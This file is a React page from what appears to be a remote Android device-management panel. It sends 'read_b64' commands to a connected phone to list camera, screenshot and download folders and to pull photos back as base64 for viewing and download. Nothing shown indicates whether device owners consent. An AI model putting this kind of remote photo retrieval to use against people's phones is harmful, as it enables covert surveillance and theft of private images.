'use client'
import { Suspense } from 'react'
import { useState, useCallback } from 'react'
import Sidebar from '@/components/Sidebar'
import { useDevice } from '@/contexts/DeviceContext'
import {
  Image, RefreshCw, Circle, ArrowLeft, ChevronRight,
  HardDrive, X, Download, FolderOpen, Folder,
} from 'lucide-react'

interface FileEntry { name: string; type: 'file' | 'dir'; size: string; permissions: string; modified: string }
interface FileListing { path: string; entries: FileEntry[] }

const IMAGE_EXTS = ['jpg', 'jpeg', 'png', 'gif', 'webp', 'bmp']
const isImage = (name: string) => IMAGE_EXTS.includes(name.split('.').pop()?.toLowerCase() ?? '')

const GALLERY_PATHS = [
  { label: 'DCIM/Camera', path: '/storage/emulated/0/DCIM/Camera' },
  { label: 'DCIM', path: '/storage/emulated/0/DCIM' },
  { label: 'Pictures', path: '/storage/emulated/0/Pictures' },
  { label: 'Screenshots', path: '/storage/emulated/0/Pictures/Screenshots' },
  { label: 'Download', path: '/storage/emulated/0/Download' },
]

function sleep(ms: number) { return new Promise(r => setTimeout(r, ms)) }

interface PreviewItem { path: string; name: string; b64: string; mime: string }

function GalleryContent() {
  const { devices, selectedId, setSelectedId, connected } = useDevice()
  const [path, setPath] = useState('/storage/emulated/0/DCIM/Camera')
  const [listing, setListing] = useState<FileListing | null>(null)
  const [browseLoading, setBrowseLoading] = useState(false)
  const [previews, setPreviews] = useState<Record<string, string>>({})
  const [loadingPreviews, setLoadingPreviews] = useState(false)
  const [fullscreen, setFullscreen] = useState<PreviewItem | null>(null)
  const [fsLoading, setFsLoading] = useState(false)

  const sendAndWait = useCallback(async (command: string): Promise<string> => {
    if (!selectedId) return ''
    const sentAt = Date.now()
    await fetch('/api/device/command', {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ deviceId: selectedId, command }),
    })
    await sleep(2500)
    for (let i = 0; i < 20; i++) {
      const r = await fetch(`/api/device/result?deviceId=${selectedId}`)
      const d = await r.json()
      const match = (d.history ?? [])
        .filter((h: { command: string; result: string; timestamp: string }) =>
          h.command === command && new Date(h.timestamp).getTime() > sentAt - 1000
        )
        .sort((a: { timestamp: string }, b: { timestamp: string }) =>
          new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime()
        )[0]
      if (match?.result) return match.result
      await sleep(1500)
    }
    return ''
  }, [selectedId])

  const browse = useCallback(async (targetPath: string) => {
    if (!selectedId) return
    setBrowseLoading(true)
    setListing(null)
    setPreviews({})
    setPath(targetPath)
    try {
      await fetch('/api/device/files', {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ deviceId: selectedId, path: targetPath }),
      })
      await sleep(3000)
      const res = await fetch(`/api/device/files?deviceId=${selectedId}`)
      const data = await res.json()
      if (data.listing) setListing(data.listing)
    } finally { setBrowseLoading(false) }
  }, [selectedId])

  const loadThumbnails = async (entries: FileEntry[], currentPath: string) => {
    if (!selectedId || loadingPreviews) return
    setLoadingPreviews(true)
    const images = entries.filter(e => e.type === 'file' && isImage(e.name)).slice(0, 12)
    for (const img of images) {
      const filePath = `${currentPath}/${img.name}`
      if (previews[filePath]) continue
      try {
        const b64 = await sendAndWait(`read_b64:${filePath}`)
        if (b64 && !b64.startsWith('ERROR')) {
          const ext = img.name.split('.').pop()?.toLowerCase() ?? 'jpeg'
          const mime = ext === 'png' ? 'image/png' : ext === 'gif' ? 'image/gif' : ext === 'webp' ? 'image/webp' : 'image/jpeg'
          setPreviews(prev => ({ ...prev, [filePath]: `data:${mime};base64,${b64.trim()}` }))
        }
      } catch {}
    }
    setLoadingPreviews(false)
  }

  const openFullscreen = async (entry: FileEntry) => {
    const filePath = `${path}/${entry.name}`
    const ext = entry.name.split('.').pop()?.toLowerCase() ?? 'jpeg'
    const mime = ext === 'png' ? 'image/png' : ext === 'gif' ? 'image/gif' : ext === 'webp' ? 'image/webp' : 'image/jpeg'

    if (previews[filePath]) {
      setFullscreen({ path: filePath, name: entry.name, b64: previews[filePath].split(',')[1], mime })
      return
    }
    setFsLoading(true)
    setFullscreen({ path: filePath, name: entry.name, b64: '', mime })
    try {
      const b64 = await sendAndWait(`read_b64:${filePath}`)
      const dataUrl = `data:${mime};base64,${b64.trim()}`
      setPreviews(prev => ({ ...prev, [filePath]: dataUrl }))
      setFullscreen({ path: filePath, name: entry.name, b64: b64.trim(), mime })
    } finally { setFsLoading(false) }
  }

  const downloadImage = () => {
    if (!fullscreen?.b64) return
    const byteChars = atob(fullscreen.b64)
    const bytes = new Uint8Array(byteChars.length)
    for (let i = 0; i < byteChars.length; i++) bytes[i] = byteChars.charCodeAt(i)
    const blob = new Blob([bytes], { type: fullscreen.mime })
    const url = URL.createObjectURL(blob)
    const a = document.createElement('a'); a.href = url; a.download = fullscreen.name; a.click()
    URL.revokeObjectURL(url)
  }

  const imageEntries = listing?.entries.filter(e => e.type === 'file' && isImage(e.name)) ?? []
  const folderEntries = listing?.entries.filter(e => e.type === 'dir') ?? []
  const breadcrumbs = path.split('/').filter(Boolean)
  const visibleCrumbs = breadcrumbs.slice(-2)
  const hiddenCount = breadcrumbs.length - visibleCrumbs.length

  const goUp = () => {
    const parts = path.split('/').filter(Boolean)
    if (parts.length <= 1) return
    browse('/' + parts.slice(0, -1).join('/'))
  }

  return (
    <div className="flex min-h-screen">
      <Sidebar connected={connected} devices={devices} selectedId={selectedId} onSelect={setSelectedId} />
      <main className="flex-1 page-content overflow-y-auto">
        <div className="max-w-5xl mx-auto px-3 md:px-6 py-3 md:py-6">

          <div className="flex items-center justify-between mb-3">
            <div>
              <h2 className="text-base md:text-xl font-bold text-white flex items-center gap-2">
                <Image size={19} className="text-android-blue" /> Gallery
              </h2>
              <p className="text-android-muted text-xs hidden sm:block">Browse images on device storage</p>
            </div>
            <div className={`flex items-center gap-1.5 text-xs font-medium px-2.5 py-1.5 rounded-full border ${connected ? 'text-android-green border-android-green/30 bg-android-green/10' : 'text-android-red border-android-red/30 bg-android-red/10'}`}>
              <Circle size={7} className={connected ? 'fill-android-green' : 'fill-android-red'} />
              {connected ? 'Online' : 'Offline'}
            </div>
          </div>

          {/* Quick gallery paths */}
          <div className="flex gap-1.5 mb-3 overflow-x-auto pb-1">
            {GALLERY_PATHS.map(({ label, path: p }) => (
              <button key={p} onClick={() => browse(p)} disabled={!connected}
                className={`shrink-0 px-2.5 py-1.5 border rounded-lg text-xs transition-colors disabled:opacity-40 whitespace-nowrap font-mono ${p === path ? 'bg-android-blue/10 border-android-blue/40 text-android-blue' : 'bg-android-surface border-android-border text-android-muted hover:text-android-blue hover:border-android-blue/40'}`}>
                {label}
              </button>
            ))}
          </div>

          {/* Path bar */}
          <div className="bg-android-surface border border-android-border rounded-xl overflow-hidden mb-3">
            <div className="px-3 py-2 flex items-center gap-2">
              <button onClick={goUp} disabled={!connected} className="p-1.5 rounded-lg hover:bg-android-border/50 disabled:opacity-30 transition-colors">
                <ArrowLeft size={14} className="text-android-muted" />
              </button>
              <div className="flex items-center gap-1 flex-1 overflow-hidden text-xs">
                <HardDrive size={11} className="text-android-muted shrink-0" />
                {hiddenCount > 0 && <span className="text-android-muted">…</span>}
                {visibleCrumbs.map((part, i) => {
                  const idx = hiddenCount + i
                  return (
                    <span key={idx} className="flex items-center gap-1 shrink-0">
                      <ChevronRight size={11} className="text-android-border" />
                      <button onClick={() => browse('/' + breadcrumbs.slice(0, idx + 1).join('/'))}
                        className="text-android-text hover:text-android-blue font-mono truncate max-w-[80px] md:max-w-none">{part}</button>
                    </span>
                  )
                })}
              </div>
              <button onClick={() => browse(path)} disabled={!connected} className="p-1.5 rounded-lg hover:bg-android-border/50 disabled:opacity-30">
                <RefreshCw size={12} className="text-android-muted" />
              </button>
              {listing && imageEntries.length > 0 && !loadingPreviews && (
                <button onClick={() => loadThumbnails(listing.entries, path)}
                  className="flex items-center gap-1.5 px-3 py-1 bg-android-blue/10 border border-android-blue/30 text-android-blue rounded-lg text-xs font-medium">
                  <Image size={12} /> Load Thumbnails
                </button>
              )}
            </div>
          </div>

          {!connected ? (
            <div className="p-12 text-center text-android-muted text-sm bg-android-surface border border-android-border rounded-xl">
              <Image size={40} className="mx-auto mb-3 text-android-border" />
              Connect a device to browse gallery
            </div>
          ) : browseLoading ? (
            <div className="p-12 text-center">
              <RefreshCw size={28} className="text-android-green mx-auto mb-3 animate-spin" />
              <p className="text-android-muted text-sm">Loading folder…</p>
            </div>
          ) : !listing ? (
            <div className="p-12 text-center bg-android-surface border border-android-border rounded-xl">
              <FolderOpen size={40} className="text-android-border mx-auto mb-3" />
              <p className="text-android-muted text-sm mb-4">Select a folder above to browse</p>
              <button onClick={() => browse(path)} className="px-5 py-2 bg-android-green text-android-bg rounded-xl text-sm font-semibold">
                Browse {path.split('/').pop()}
              </button>
            </div>
          ) : (
            <>
              {/* Subfolders */}
              {folderEntries.length > 0 && (
                <div className="mb-4">
                  <p className="text-xs text-android-muted mb-2">Folders ({folderEntries.length})</p>
                  <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 gap-2">
                    {folderEntries.map(e => (
                      <button key={e.name} onClick={() => browse(`${path}/${e.name}`)}
                        className="flex items-center gap-2 p-3 bg-android-surface border border-android-border rounded-xl hover:border-android-yellow/40 hover:bg-android-yellow/5 transition-colors text-left">
                        <Folder size={18} className="text-android-yellow shrink-0" />
                        <span className="text-xs text-android-text truncate">{e.name}</span>
                      </button>
                    ))}
                  </div>
                </div>
              )}

              {/* Images */}
              {imageEntries.length === 0 ? (
                <div className="p-8 text-center text-android-muted text-sm bg-android-surface border border-android-border rounded-xl">
                  <Image size={32} className="mx-auto mb-3 text-android-border" />
                  No images in this folder
                </div>
              ) : (
                <>
                  <div className="flex items-center justify-between mb-2">
                    <p className="text-xs text-android-muted">{imageEntries.length} images {loadingPreviews && '· Loading thumbnails…'}</p>
                    {loadingPreviews && <RefreshCw size={12} className="text-android-muted animate-spin" />}
                  </div>
                  <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-5 gap-2">
                    {imageEntries.map(entry => {
                      const fp = `${path}/${entry.name}`
                      const thumb = previews[fp]
                      return (
                        <button key={entry.name} onClick={() => openFullscreen(entry)}
                          className="aspect-square bg-android-surface border border-android-border rounded-xl overflow-hidden hover:border-android-blue/40 transition-colors group relative">
                          {thumb ? (
                            <img src={thumb} alt={entry.name} className="w-full h-full object-cover" />
                          ) : (
                            <div className="w-full h-full flex flex-col items-center justify-center gap-1.5">
                              <Image size={22} className="text-android-border" />
                              <span className="text-[9px] text-android-muted px-1 text-center leading-tight truncate w-full">{entry.name}</span>
                            </div>
                          )}
                          <div className="absolute inset-0 bg-black/0 group-hover:bg-black/20 transition-colors" />
                        </button>
                      )
                    })}
                  </div>
                </>
              )}
            </>
          )}
        </div>
      </main>

      {/* Fullscreen viewer */}
      {fullscreen && (
        <div className="fixed inset-0 z-50 bg-black flex flex-col" onClick={e => { if (e.target === e.currentTarget) setFullscreen(null) }}>
          <div className="flex items-center justify-between px-4 py-3 bg-black/60 backdrop-blur shrink-0">
            <span className="text-white text-sm font-medium truncate flex-1 mr-4">{fullscreen.name}</span>
            <div className="flex items-center gap-2">
              {fullscreen.b64 && (
                <button onClick={downloadImage}
                  className="flex items-center gap-1.5 px-3 py-1.5 bg-android-blue/20 border border-android-blue/40 text-android-blue rounded-lg text-xs font-medium">
                  <Download size={13} /> Download
                </button>
              )}
              <button onClick={() => setFullscreen(null)} className="p-1.5 rounded-lg bg-white/10 text-white hover:bg-white/20">
                <X size={18} />
              </button>
            </div>
          </div>
          <div className="flex-1 flex items-center justify-center overflow-hidden p-4">
            {fsLoading || !fullscreen.b64 ? (
              <div className="flex flex-col items-center gap-3">
                <RefreshCw size={28} className="text-android-green animate-spin" />
                <p className="text-white/60 text-sm">Loading image…</p>
              </div>
            ) : (
              <img
                src={`data:${fullscreen.mime};base64,${fullscreen.b64}`}
                alt={fullscreen.name}
                className="max-w-full max-h-full object-contain rounded-lg"
              />
            )}
          </div>
          <div className="px-4 py-2 bg-black/60 shrink-0">
            <p className="text-white/40 text-xs font-mono truncate">{fullscreen.path}</p>
          </div>
        </div>
      )}
    </div>
  )
}

export default function GalleryPage() {
  return (
    <Suspense fallback={<div className="flex min-h-screen items-center justify-center text-android-muted text-sm">Loading…</div>}>
      <GalleryContent />
    </Suspense>
  )
}
